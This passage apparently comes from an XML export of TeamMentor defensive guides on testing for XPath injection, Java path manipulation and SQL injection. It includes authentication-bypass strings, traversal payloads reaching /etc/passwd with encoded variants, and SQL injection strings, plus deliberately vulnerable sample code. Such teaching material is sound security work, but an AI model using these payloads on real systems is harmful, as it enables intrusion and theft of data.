authentication page in the server that uses XPath. </li><li>Enter a string (first for the username and then for the password) containing and additional true command. </li><li>Submit the authentication form to the server.</li></ol><br><p>Expected results:&nbsp; The application should not authenticate the client.&nbsp; </p><p><strong></strong></p><h2><em>Testing for Normal XPath Injection Information Disclosure</em></h2><p>Hardware Requirements:&nbsp; One client computer and one server computer running the web application.</p><p>Tools:&nbsp;&nbsp; Web browser.</p><p>Testing steps:</p><ol><li>In the client computer, open the web browser and navigate to any web form or other entry point that the server uses to build an XPath query. </li><li>Enter a string containing an additional command that executes an XPath query on another user’s node. </li><li>Submit the form to the server.</li></ol><br><p>Expected results:&nbsp; The application should not send a response containing data from the other user’s XML node.</p><p><strong></strong></p><h2><em>Testing for Blind XPath Injection Information Disclosure</em></h2><p>Hardware Requirements:&nbsp; One client box computer one server computer running the web application.</p><p>Tools:&nbsp;&nbsp; Web browser.</p><p>Testing steps:</p><ol><li>In the client computer, open the web browser and navigate to any web form or other entry point that the server uses to build an XPath query. </li><li>Enter a string containing an additional command that gathers partial knowledge of confidential information in the XML store. </li><li>Submit the form to the server. </li><li>Repeat steps 2 and 3 until the desired information is fully disclosed.</li></ol><br><p>Expected results:&nbsp; The application should not disclose the desired information.</p><p><strong>&nbsp;</strong></p><h1>Step 4:&nbsp; Fine-tune Test Case Data</h1><p>Finally, to achieve proper test case coverage, you must submit tests cases through different application entry points and adapt the format of the test data depending on the data format required for each entry point and each type of attack that can be carried out.&nbsp;&nbsp; </p><p>&nbsp;</p><h2><em>Tune test case data format according to entry points</em></h2><p>Like when testing for any injection bug, it is important that you adapt the data used in test cases according to the entry point under test.&nbsp; For example, when testing through URL parameters, the first string might look like the second or the third depending on the URL-encoding schema:</p>
<pre>user' or '1' = '1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; original test string</pre><pre>user'+or+'1'+=+'1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; string under URL encoding schema 1</pre><pre>user'%20or%20'1'%20=%20'1&nbsp;&nbsp;&nbsp; string under URL encoding schema 2</pre><p>You must consider tuning the test case format for different entry points below such as URL parameters, web form fields, web services methods, flash parameters, etc.</p><p><strong><em>&nbsp;</em></strong></p><h2><em>Fine-tune test case data according to different attack objectives</em></h2><p>Finally, you must consider the different variations and constructs depending on the attack objective that the test case executed.&nbsp;&nbsp; The table below shows test case constructs depending on the objective.</p><table><tbody><tr><td><p><strong>Construct</strong></p></td><td><p><strong>Attack Objective</strong></p></td></tr><tr><td><br><p>•&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a' or '1=1'</p><p>•&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a" or "1"="1</p><p>•&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a'] or '1'='1</p><p>•&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a"] or "1"="1</p><p>•&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ' or 1=1 or ''='</p><p>&nbsp;</p></td><td><p>Authentication bypass</p></td></tr><tr><td><p>•&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (string-length(S))</p><p>•&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (substring(S,N,1))</p><p>•&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; count(//user/child::node())</p><p>&nbsp;</p></td><td><p>Blind XPath injection</p></td></tr><tr><td><p>•&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; namespace-uri(path)<a href="about:blank#_edn4" name="_ednref4">[iv]</a>.</p><p>•&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; name(path)</p><p>•&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; count(path/child::node())</p><p>•&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; count(path/child::text())</p><p>•&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; count(path/child::comment()) </p><p>•&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; count(path/child::*) count(path/child::processing-instruction()) </p></td><td><p>XML Crawling</p></td></tr></tbody></table><p>&nbsp;</p><h1>Conclusions</h1><p>XPath Injection is a vulnerability that allows bypassing authentication and accessing an entire XML document.&nbsp; It is caused because the vulnerable application fails to properly validate and sanitize user input and uses the input as part of an XPath query.&nbsp;&nbsp; There are different test cases to execute depending on the type of XPath Injection under test: normal or simple XPath Injection, blind XPath Injection, and XML crawling.&nbsp; </p><p>&nbsp;</p><div><br><hr><div><p>[i] <strong>OWASP - XPath Injection Overview</strong>. Roberto Suggi Liverani. <a href="http://www.owasp.org/index.php/XPATH_Injection">http://www.owasp.org/index.php/XPATH_Injection</a></p><br></div><div><p>[ii] <strong>OWASP - Blind XPath Injection.</strong> <a href="http://www.owasp.org/index.php/Blind_XPath_Injection">http://www.owasp.org/index.php/Blind_XPath_Injection</a>&nbsp;</p></div><div><p>[iii]&nbsp; <strong>OWASP -XPath Injection.</strong> <a href="http://www.owasp.org/index.php/XPath_Injection">http://www.owasp.org/index.php/XPath_Injection</a></p><br></div><div><p>[iv]&nbsp; <strong>Blind</strong> <strong>XPath</strong> <strong>Injection</strong>. Amit Klein. <a href="http://www.modsecurity.org/archive/amit/blind-xpath-injection.pdf">http://www.modsecurity.org/archive/amit/blind-xpath-injection.pdf</a></p><p>&nbsp;</p></div></div>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-863609046" Content_Hash="-1851017305">
    <Metadata>
      <Id>737c7f96-0f85-4f97-94e3-cb473008d721</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>How to Test for Path Manipulation Bugs in Java</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Test</Phase>
      <Technology>Java</Technology>
      <Type>How To</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority />
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li>J2EE applications</li></ul><h1>Summary</h1><p>In a path manipulation attack, an attacker submits input to alter an internal file path used by the application, forcing the application to use a malicious path. Attackers may exploit this bug to read sensitive files on the server, such as configuration files or another user’s files, or to modify or delete server-side files. </p><p>Follow these steps to test for path manipulation bugs in J2EE:</p><ul><li>Step 1: Understand attack scenarios </li><li>Step 2: Analyze causes and countermeasures </li><li>Step 3: Start testing and exploring </li><li>Step 4: Execute additional testing</li></ul><h1>Step 1: Understand Attack Scenarios</h1><p>The first step in testing for path manipulation bugs is to understand the anatomy of an attack scenario. </p><p>To exploit this vulnerability, the attacker manipulates a file path in an HTTP request. If the application is vulnerable, it uses the manipulated file path to perform a file system operation.</p><p>The attack starts with the attacker discovering an HTTP request that invokes a server-side file system operation such as reading, modifying, deleting, emailing, or printing a file. This request comes either from a Web page or from a client-side script (such as in AJAX applications) and contains a variable (URL parameter, Web form input, etc) that the server uses to determine what file to handle.</p><p>To execute the attack, the attacker submits the request but modifies this variable in an attempt to manipulate a server-side file. If the attack is successful, the value provided by the attacker causes the server to access a file in a different path. In most cases, the attacker will be able to tell if the attack is successful shortly after executing it.</p><p>The steps are then:</p><ol><li>The attacker finds an HTTP request that invokes a file system operation at the server. </li><li>The attacker locates a variable in&nbsp;that HTTP request that is used to determine the path for a file system operation. </li><li>The attacker submits the request but modifies the path-determining variable and waits for a server response. </li><li>The attacker verifies if the attack is successful by observing the server’s response. </li></ol><h2><em><br>Attack Variants</em></h2><p>Attackers can employ path manipulation attacks to achieve different threats. For example, an attacker can manipulate a path to read server configuration and password files or to read files belonging to another user in order to &nbsp;execute an information disclosure attack on the application. Similarly, an attacker can manipulate a path to force the J2EE application to delete a file needed to properly service its users, thus generating a denial of service situation.</p><h1>Step 2: Analyze Causes and Countermeasures</h1><p>Before executing practical test cases, it is necessary to understand why these bugs exist and how to avoid them.</p><p>Path manipulation bugs are caused by J2EE applications that use client-supplied input to build a file path without properly validating the input. For instance, the code below gets an input value from the user in a URL parameter named <em>filename</em>:</p><blockquote><pre>PrintWriter out = response.getWriter();<br>&nbsp;<br>String filename = "/public/user_files/" + request.getParameter("filename").toString();<br>&nbsp;<br>File file = new File(filename);<br>FileReader fr = new FileReader(file);<br>BufferedReader br = new BufferedReader(fr);<br>String line = br.readLine();<br>while ( line != null )<br>{<br>  out.println(line);<br>&nbsp;&nbsp;   line = br.readLine();<br>}<br>fr.close();<br>out.close();</pre></blockquote><br><p>If the user provides an expected file name such as <em>file.txt</em>, the application returns an expected user file:</p><blockquote><pre>http://example.com.pe/example/getFile?filename=<strong>file.txt</strong></pre></blockquote><p><strong></strong></p><p>However, in a path manipulation scenario, an attacker provides a malicious value for the variable, hoping that the application uses it to determine a different file path:</p><blockquote><pre>http://example.com.pe/example/getFile?filename=<strong>../../private/secret.txt</strong></pre></blockquote><p><strong></strong></p><p>The string above causes the application to go up two directories, navigate to the <em>private</em> folder, and display <em>secret.txt.</em> The example above is a common scenario in information disclosure due to path manipulation. Notice that the attack is possible because the code shown trusts the filename provided by the client; it starts by directly copying the input to the internal variable used to determine the filename without properly validating it.</p><p>To protect against this bug, J2EE applications must properly validate user input. Specifically, they must check if the input is safe to use in determining a file path. Developers can use blacklists that contain a list of all disallowed filename constructs such as <strong>../</strong> and check if the user input appears in the blacklist. The problem with blacklists is that blacklists must account for 100% of attack variants to be effective. Any variant of an attack that is not accounted for will execute unnoticed.</p><p>As such, the recommended approach for defending against this bug is to use <em>whitelists. </em>Whitelists specify only safe constructs, and disallow any user input that doesn’t match any of the specified safe constructs. By doing this, they only need to specify what is good and don’t have to worry about accounting 100% of all attack variants. A common way of implementing a whitelist is by using a regular expression to specify what is safe and to disallow all input that doesn’t match the regular expression:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p><blockquote><pre>String input = request.getParameter("filename").toString();<br>&nbsp;&nbsp; <br>String safeConstruct = "^[a-zA-Z]{4,8}\.txt$";<br>Pattern regexPattern = Pattern.compile(safeConstruct);<br>Matcher regexMatcher = regexPattern.matcher(input);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>if (!regexMatcher.find())<br>{<br>  out.println("invalid input");<br>}<br>else&nbsp; <br>{<br>  String filename = "/public/user_files/" + input; <br>&nbsp;  File file = new File(filename);<br>  &nbsp;<br>  /* continue reading file */<br>}</pre></blockquote><p>The input must consist of four to eight consecutive upper- or lower-case letters followed by the extension <strong>.txt</strong>. Any input that doesn’t match this form results in the application giving an <em>invalid input</em> error.</p><h1>Step 3: Start Testing and Exploring</h1><p>Now that you’ve learned the common attack scenarios as well as the causes and countermeasures for path manipulation bugs, it is necessary to execute basic test cases to check if your application is vulnerable.</p><p>Success in testing for path manipulation bugs depends on your ability to determine what variables the application uses to build a file path. Applications commonly use URL and Web form variables, so it is necessary to understand how to test through these two input points. </p><h2><em>Test for path manipulation in URL variables</em></h2><p>Follow these steps to test for path manipulation in an URL variable:</p><ol><li>Use an Internet browser to perform a file system operation. Note the URL used, such as: <em>http://example.com.pe/example.jsp?<strong>page=index.html</strong></em>. </li><li>Locate the URL variable used to by the application to determine the file name (in this case it is <em>page</em>). </li><li>Replace the value of the variable found in Step 2 with an attack string (see Table 1 below). For instance: <em>http://example.com.pe/example.jsp?page<strong>=</strong>../../../etc/passwd</em>. </li><li>Submit the request to the application and wait for a response.</li></ol><p>Expected results: The application must give an error message indicating that the file path has been manipulated. The application is vulnerable if it uses the path supplied in Step 3 to determine the response, and the attacker-specified file is used in the response.</p><h2><em>Test for path manipulation in Web form variables</em></h2><p>Follow these steps to test for path manipulation through Web forms:</p><ol><li>Navigate to a page containing a Web form that prompts for a file name. </li><li>Locate the variable (input field) used by the application to determine the file name. </li><li>Enter the attack string in the field that indicates the filename (see Table 1 below).<br>Here, it is important to disable any client-side checks that may deny entering an attack string due to illegal characters. For more information, see <a href="ruledisplay:fc95c5e5-667a-4e66-b1cf-f7d0529c4c2f">How to Test for Client-Side Validation Bypass Bugs in Java</a>. </li><li>Submit the request to the application and wait for a response.</li></ol><p>Expected results are the same as the previous test case: The application must give an error message indicating that the file path has been manipulated. The application is vulnerable if it uses the path supplied in Step 3 to determine the response, and the attacker-specified file is used in the response.</p><h2><em>Attack strings</em></h2><p>The following attack strings contain path manipulation characters (dots, slashes, and backslashes) and common UNIX- and Windows-related file paths in different encodings. Depending on the relative location of the Web application on the server, the number of “../” or “..\” clauses may need to be increased or decreased to realize an attack:</p><table><tbody><tr><td><pre>../etc/passwd<br>..\boot.ini<br>../boot.ini<br>folder_name/file_name<br>..\..\folder_name\file_name<br>../../folder_name/file_name<br>C:\boot.ini<br>%2e%2e\%2e%2e\<br>..%2f..%2f<br>%2e%2e%2f%2e%2e%2ffolder_name%2ffile_name<br>..%2f..%2ffolder_name%2ffile_name<br>..%c0%af..%c0%affolder_name..%c0%affile_name </pre></td></tr></tbody></table><p>&nbsp;<strong>Table 1 - Path Manipulation Attack Strings</strong></p><h2><em>Look for error messages that indicate file operations</em></h2><p>While executing the basic test cases mentioned above, it is important to look for different types of error messages. For instance, “invalid input” or “incorrect format” error messages indicate that an application is safe, while “file not found” or HTTP 404 errors indicate that the application may be using the attack string to find a file in a different path, and may be vulnerable to this bug.</p><h1>Step 4: Execute Additional Testing</h1><p>Finally, it is important to execute additional testing for double encoding scenarios as well as to cover all of the application’s input points.<strong><em></em></strong></p><h1><em>Cover double encoding scenarios</em></h1><p>Since this attack requires passing malicious input to a Web application, it is necessary for proper coverage to add double encoding test cases. Double encoding consists of re-encoding the percent sign (%) in percent-encoded values with its percent-encoded equivalent (%25). For instance, translating the first URL into the second one:</p><blockquote><pre>../../&nbsp; (no encoding)</pre><pre>..%2f..%2f&nbsp;&nbsp;&nbsp;&nbsp; (single encoding)</pre><pre>..%252f..%252f (double encoding)</pre></blockquote><p>Make sure to add a double-encoded test case for every attack string that you use. For more information about double encoding attacks, see <a href="ruledisplay:5c99da7b-b4eb-4315-b48c-ac2598c13144">How to Test for Double Encoding Bugs in Java</a><em>.</em></p><h2><em>Test through all input points</em></h2><p>Even though path manipulation attacks commonly happen through the URL or Web forms, it is important to look at additional application input points. Web applications can also take input from client cookies, Web methods, extended frameworks (such as Flash/Flex), and third-party APIs (such as Facebook) parameters. Make sure to test for path manipulation in every place where input is taken.</p><h1>Conclusions</h1><p>Path manipulation bugs allow attackers to access a server-side file to execute attacks such as information disclosure and denial of service. They&nbsp;can be&nbsp;successful when applications don’t properly validate user input against a whitelist and allow path manipulating characters such as dots and slashes to be processed by the application. To test for this vulnerability, you must identify the file path determining variable, commonly sent in the URL or in a Web form, and replace it with an attack string while looking for an error message that indicates that the attack string is being used. Finally, to achieve proper test coverage of this bug, be sure to cover double encoding scenarios and test through all of the application’s input points.</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="1927769840" Content_Hash="1967739888">
    <Metadata>
      <Id>73fc5ea6-1115-4210-92bd-1941e4f46e25</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>How to Test For SQL Injection Bugs</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Test</Phase>
      <Technology> Any</Technology>
      <Type>How To</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<br><br><h1>Applies to</h1><p>All applications that interact with a database such as: </p><ul><li>Web applications written ASP, ASP .NET, PHP, Visual Basic, C#, Java, or Perl using a database </li><li>Non web-applications that interact with database back-end</li></ul><br><h1>Summary</h1><p>SQL Injection is a common type of web database related vulnerability.&nbsp;&nbsp; SQL injection is common to web site applications that interact with a database backend.&nbsp; These sites construct SQL commands or queries based on user input.&nbsp; For example they might search a product database based on a description a user typed in a web form.&nbsp; An application is vulnerable to SQL injection when it builds SQL queries without filtering the user's input, without using store procedure, or without binding parameters variables.&nbsp; This can lead to an attacker adding additional clauses, conditions, or even commands that execute along the original query.&nbsp;&nbsp;&nbsp; Attackers can use SQL Injection bugs to execute different types of attacks such as data theft and tampering, authentication bypass, information disclosure, and elevation of privileges.</p><p>Below is a summary of steps needed for testing for SQL injection bugs</p><ul><li><strong>Step 1</strong>:&nbsp; Understand SQL injection attack scenarios </li><li><strong>Step 2</strong>:&nbsp; List high risk components and entry points </li><li><strong>Step 3</strong>:&nbsp; Start testing and exploring </li><li><strong>Step 4</strong>:&nbsp; Tune of test data</li></ul><br><p><strong>Step 1:&nbsp; Understand Attack Scenarios</strong></p><p>It is important to understand attack scenarios so that you know what to look for when testing for SQL injection.&nbsp; Here are two common attack scenarios:</p><ul><li>Search Engine scenario </li><li>Form Authentication scenario</li></ul><p><strong><em>Search engine scenario</em></strong></p><p>Most web sites have search pages that take a search query from the user, create a SQL query with it, execute the query at a SQL backend database, and return the results to the user.&nbsp; These components will end up creating a SQL similar to this:</p><pre>SELECT * item, description FROM products WHERE description LIKE usersearch (from input)</pre><p>For instance, a web server takes search data from the user either from a form or from a URL that looks like this:</p><pre>http://www.teammentorexample.com/products/search.php?prod=bike (PHP)</pre><pre>http://www.teammentorexample.com/products/search.asp?prod=bike (ASP)</pre><p>The server might use code like this in the search component: </p><pre>$query = "select item, description from productTable where description LIKE '%" . $_GET["prod"] . "%'"&nbsp;&nbsp; (PHP)</pre><pre>var query = "select item, description from productTable where description LIKE '%" + Request.QueryString("prod") + "%'"&nbsp; (ASP)</pre><p>In both of the cases above the attacker can modify the URL and inject SQL statements that will be concatenated to the query and executed as part of the SQL query.&nbsp; If the attacker changes the value passed in prod by:</p><pre>any OR 1=1</pre><p>Then the query will return all of the rows in the table since the second condition 1=1 will be always true:&nbsp; </p><p>SELECT * item, description FROM products WHERE description LIKE 'any' OR 1=1</p><p><strong><em>Forms authentication scenario</em></strong></p><p>Another example of a high risk component is the code used in forms authentication. For example, the code below, accepts credentials to build a SELECT query to validate the user.&nbsp; The data is passed to the login.php page through a web form's POST using username and password variables.&nbsp; </p><p>A SQL injection bug is present in this code:</p><pre>$query = "SELECT * FROM Accounts WHERE UserName = '" . $_POST['name'] . "'" . " AND password = '" . $_POST['pass'] . "'"; </pre><pre>$result = odbc_exec($connection, $query);</pre><pre>if ($result_count == 0) {</pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print('unable to login');</pre><pre>}</pre><pre>else {</pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print('user logged in');</pre><pre>}</pre><p>An attacker can submit the same string as in the first scenario:</p><pre>any OR 1=1</pre><p>This will result in the following statement constructed:</p><pre>SELECT * FROM Accounts WHERE UserName = any or 1=1</pre><p>The statement returns all rows from the Accounts table.&nbsp; The if condition in the code will be false and the attacker will be able to log in without a valid password.</p><p><strong><em>Stored procedure scenario</em></strong></p><p>SQL injection bugs aren';t necessarily restricted to the application layer.&nbsp; For instance, a stored procedure used at the database layer may also suffer from SQL injection.&nbsp; Consider the following procedure that takes a parameter for a product name and searches a database by building a dynamic SELECT statement inside:</p><p>&nbsp;</p><pre>CREATE PROCEDURE sp_SearchProducts @prodname varchar(400) = NULL AS</pre><pre>DECLARE @sql nvarchar(4000)</pre><pre>SELECT @sql = ' SELECT ProductID, ProductName, Category, Price ' +</pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ' FROM Product Where ProductName LIKE ''' + @prodname + ''''</pre><pre>EXEC (@sql)</pre><p>&nbsp;</p><p>The can invoke the procedure at the application layer like this:</p><pre>exec sp_SearchProducts('any'' OR 1=1--')</pre><p>The final statement will look like this:</p><pre>SELECT ProductID, ProductName, Category, Price FROM Product Where ProductName LIKE 'any' OR 1=1—'</pre><p>&nbsp;</p><p>This will return all rows of the product table.&nbsp; </p><p>Be careful with this type of scenario since it is a common misbelieve that using stored procedures and bound parameters solve SQL injection automatically.</p><p>&nbsp;</p><p><strong>Step 2: List High Risk Components and Entry Points</strong></p><p>The next step for SQL Injection testing is to list all the places where code builds SQL statements from user supplied input; to understand how and where our application manipulates statement and talks to a database.&nbsp; The most common are:</p><ul><li>Search web pages </li><li>Profile-related web pages </li><li>Authentication forms </li><li>E-Commerce or financial account-related pages </li><li>Database interaction public API's and DCOM methods </li><li>Database system-level clients</li></ul><p><strong><em>Identify all high risk components </em></strong></p><p>After understanding the details of SQL Injection, list their high risk components in a table that includes the method that hosts the code, the name of the query string if available, and the variable names that influence the construction of the query&nbsp;</p><p>Look at code like the one shown in the scenarios above; code where SQL statements are built using web input.&nbsp; Then list all of these web pages as high risk components.</p><p><strong><em>Match High Risk Components with Entry Points</em></strong></p><p>After listing all areas in the application where SQL statements are built at run-time, you&nbsp; must identify the ways in which data gets to these places.&nbsp; For example, you listed a web page named "search.asp" above that constructs SQL statements dangerously.&nbsp; Here you list how this page gets its input; what are its entry points.&nbsp; Keep in mind that entry points can be both intended (expected by the program or application) and unintended (unexpected by program or application).&nbsp; A common list of entry points for SQL injection high risk components include:</p><ul><li>URL bar contents </li><li>Web form input values </li><li>Web service methods </li><li>Network packets </li><li>Public API's </li><li>DCOM methods </li><li>Application UI text fields </li><li>Inter Process Communication pipe</li></ul><p>The first three are the most common entry points for web services and application.&nbsp; Nonetheless, always look for new entry points additional entry points not listed here.&nbsp; Make sure that the data manipulated by the component at risk is not passed by any other means.</p><p>Ideally by the end of step 2 you will have a table like the one shown above to systematically guide test execution.</p><p><strong>Step 3: Start Testing and Exploring </strong></p><p>The following step is to start supplying input to the application that gives hints of possible SQL injection bugs.&nbsp; With the list made during step 2, you can systematically walk through all variables and start exploring how the test input is handled.&nbsp; In this step, we recommend to execute a first pass using fuzz strings and basic conditions.</p><p><strong><em>Start with a simple fuzz string</em></strong></p><p>The first recommended test is to add some string and a single quote or parenthesis at the end of it.&nbsp; In most SQL Injection cases this kind of string will generate a server side error that will be displayed back in the client's browser:</p><pre>xyz') "]</pre><p>Then see how the server reacts to it.&nbsp; In some cases it will strip out the special characters: this is a sign that it protects against injection.&nbsp; However, in other cases the application may return a SQL related error messages because a special character such as the single quote unexpectedly closed a statement.&nbsp; It then can be deduced that the statement was being built dynamically.&nbsp; This is a clear indication that you need to keep looking to see whether a SQL injection bug actually exists.</p><p><strong><em>Continue with simple true and false conditions</em></strong></p><p>The next step is to try to add a simple SQL statement.&nbsp; The simplest you can try is an integer comparison such as 1=1 or 2&gt;1 or a character comparison such as 'a'='a' proceeded by an OR.&nbsp; For instance:</p><pre>xyz' OR 1=1 --</pre><p>&nbsp;Then observe the results.&nbsp; Look for any indication that the o injected true statement returned all rows of a table.&nbsp; Then try a false statement and look at the difference.</p><pre>xyz' OR 1&gt;2 --</pre><p>If the results are visibly different in quantity or in server behavior, then the possibility for a SQL injection bugs is high.&nbsp; Even if no information about the database structure or no other serious attack is possible, you can determine SQL injection by observing basic server and error messages.&nbsp; </p><p>Consider the following scenario.&nbsp; The string "xyz' OR 1=1" -is submitted and the server returns a 500 error that says:</p><pre>&nbsp;"Results Buffer too Large" and when "xyz' OR 1&gt;2 -" </pre><p>is submitted the server returns a valid page saying that there were no matches.&nbsp; So when the condition is true the server chokes with results.&nbsp; When it's false it returns no results.&nbsp; In this case, the processing of the injected condition is evident and means that there is a SQL injection bug.&nbsp; It might not be exploitable but it exists and this simple difference in server behavior is enough to prove that it does.</p><p><strong><em>NOTE: Be careful with valid numerical results</em></strong></p><p>Make sure that when using numerical comparisons the results are different because of the comparison and not because of the content.&nbsp; For example, if when using 1=1 the server returns phone numbers with "11" and when 1&gt;2 returns "21" numbers or matches then it means that is not processing the actual comparison.&nbsp; The results are different because the application is querying over the numbers 1 and 2.&nbsp; The server is not executing the extra conditions as separate statements; it is correctly including them as part of the data to search, and there is no evidence of a SQL injection vulnerability.&nbsp; You need to be careful about this scenario and realize when the extra condition is actually being executed separately or not.</p><p><strong>Step 4: Tune test cases data </strong></p><p>At this point you have started executing an exploratory pass through the input variables.&nbsp; During step 4 you need to concentrate on covering all entry points of each variable in your variable table.</p><p><strong><em>Learn type database version </em></strong></p><p>Different database applications and versions process queries differently.&nbsp; For example SQL Server uses + to concatenate strings in a statement while Oracle uses ||.&nbsp;&nbsp; SQL Server allows execution of batched or multiple SQL commands within a statement as long as they are separated with a semicolon (;) while Oracle and MySQL forbids this.&nbsp; You can gather database brand and versions by scanning network ports at the server, sniffing network traffic, or looking at SQL related error messages.</p><p><strong><em>Consider string format and encoding according to entry point</em></strong></p><p>As you walk through the risky variables and entry points take into account the different formats that apply to each entry point.&nbsp; For example, this article described passing the following string to a web form:</p><pre>xyz' OR 1=1 --</pre><p>However, you can't pass a string like the one above in a URL since the URL doesn't allow blank spaces.&nbsp; Server applications use different encoding functions to transmit URL contents.&nbsp; They encode data and then decode it at the server end.&nbsp; The encoding and decoding depends on the server's programming language.&nbsp; For example, sometimes the encoding function replaces the blank spaces with a plus (+) sign so the string above looks like this:</p><pre>xyz'+OR+1=1+--</pre><p>In other encoding case, the server might replace the blank space with a %20.&nbsp; In that case, the test string will need to look like this:</p><pre>xyz'%20OR%201=1%20--</pre><p>This common encoding scheme consists of replacing spaces with their hexadecimal values %HH.&nbsp; In addition, it is recommended to also encode reserved characters such as the single quote.&nbsp; The encoded string will then look like this:</p><pre>xyz%27+OR+1%3D1+--</pre><p>The Java URL encode function translates special characters using a string like this one %uXXXX where XXXX is the character´s Unicode value represented as four digits.&nbsp; The above string will look like this one:</p><pre>xyz%u2019+OR+1%3D1+--</pre><p>There are different types of encoding mechanisms.&nbsp; It is important that you do a quick source review to see what encoding functions are used and then at the documentation available for the specific functions. To learn more, see "Percent Encoding" at <a href="http://en.wikipedia.org/wiki/Percent-encoding">http://en.wikipedia.org/wiki/Percent-encoding</a>.</p><p><strong><em>Note:&nbsp; Try to use double encoding</em></strong></p><p>It is important to attempt to execute double encoding cases.&nbsp;&nbsp; Double encoding is a specific encoding aimed at bypassing security controls.&nbsp; It consists of replacing the percent character by its hexadecimal value (25).&nbsp; If you are testing using single encoding like this:</p><pre>xyz%27+OR+1%3D1+--</pre><p>Then try the following string for double encoding:</p><pre>xyz%2527+OR+1%253D1+--</pre><p><strong><em>Try different syntax</em></strong></p><p>SQL injection testing aims at changing the logic of the original SQL statement by adding additional ones.&nbsp; But for the additional statements to execute, the attacked query has to remain syntactically correct or else it will fail to execute.&nbsp; Consider different variants of test input to deal with the closing of quotes and parenthesis.&nbsp; Here are a few variations to try:</p><ul><li>x' or 1=1 -- </li><li>x' or 'a'='a </li><li>x" or 1=1 # </li><li>x%' or 1=1 --&nbsp;&nbsp;&nbsp;&nbsp; </li><li>x%" or 1=1 # </li><li>x') or 1=1 # &nbsp;&nbsp;&nbsp;&nbsp; </li><li>x') or 'a'='a' -- &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </li><li>x') or ('a'='a</li></ul><p><strong><em>Consider the different ways of getting test results</em></strong></p><p>There are different channels to retrieve SQL injection data:</p><ul><li><strong>In band</strong> - When the attacked server returns the data to the attacker using an existing channel such as a rendered table in a web page, or by logging on the user to a restricted page </li><li><strong>Out of band</strong> - When the attacker opens a new connection to get data from the server such as when installing a Trojan in the server, using an extended stored procedure such as xp_cmdshell to open a remote connection, or using MS SQL's OPENROWSET() to connect directly to the database. </li><li><strong>Inferred</strong> - When the attacked server doesn't send any data to the attacker and the attacker needs to execute his attack using alternate queries and observing error codes.</li></ul><p>Cover the different methods of retrieving data from the server during this step.&nbsp;&nbsp;<strong><em>&nbsp;</em></strong></p><p><strong><em>Execute different payloads</em></strong></p><p>Sometimes executing a simple true or false condition will not generate visible results.&nbsp; This is the main reasons why you need to try different payloads.&nbsp; There are hundreds of possible payloads to execute in a SQL injection attack.&nbsp; Most of these payloads vary between SQL server applications and can be found in the web.&nbsp; Just to get an idea of how different payloads can be, let's picture the case of trying to steal information from a database. &nbsp;The payload can vary between:</p><ul><li>An OR with simple condition that returns all rows (like OR 1=1) </li><li>An UNION SELECT statement that executes and additional SELECT query and appends the results to the original result set. To learn more, see&nbsp;<a href="http://www.securitydocs.com/pdf/2656.PDF">SQL Injection:&nbsp; Are your Web Applications Vulnerable?</a> </li><li>An OPENROWSET command that opens a connection to a hacker database and sends the data to the remote attacker. To learn more, see <a href="http://www.appsecinc.com/presentations/Manipulating_SQL_Server_Using_SQL_Injection.pdf">Manipulating Microsoft SQL Server Using SQL Injection</a> </li><li>A call to a stored procedure such as xp_cmdshell to open a backdoor or install a Trojan that will send the information back to the attacker </li><li>An inference attack that uses CASE statements to get data byte by byte. To learn more, see <a href="http://www.ngssoftware.com/papers/sqlinference.pdf">Data-mining with SQL Injection and Inference</a></li></ul><p>Tampering also has different scenarios:</p><ul><li>An additional DROP statement to drop a table from a database </li><li>An additional INSERT statement to add a record to a table </li><li>An additional UPDATE statement to replace existing data in a table</li></ul><p>You need to try different payloads.&nbsp;&nbsp; We recommend listing all the payloads that can be executed against the database under test.&nbsp;&nbsp; Then to execute each payload with the syntactic variations previously mentioned.&nbsp; By doing this, you will expand their SQL injection test cases to get maximum testing coverage. 